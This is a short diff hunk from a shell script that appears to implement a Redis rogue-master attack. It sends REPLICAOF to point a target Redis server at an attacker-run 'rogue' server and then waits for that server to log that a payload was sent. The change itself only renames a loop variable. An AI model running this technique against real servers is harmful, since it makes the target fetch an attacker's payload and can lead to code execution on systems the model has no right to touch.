@@ -183,7 +183,7 @@ log "REPLICAOF $LOCAL_IP $ROGUE_PORT"
 rcmd REPLICAOF "$LOCAL_IP" "$ROGUE_PORT" >/dev/null
 
 # Wait for rogue to log "Sent N bytes payload"
-for i in $(seq 1 20); do
+for _ in $(seq 1 20); do
     grep -q "Sent .* bytes payload" /tmp/rogue_${$}.log 2>/dev/null && break
     sleep 0.5
 done
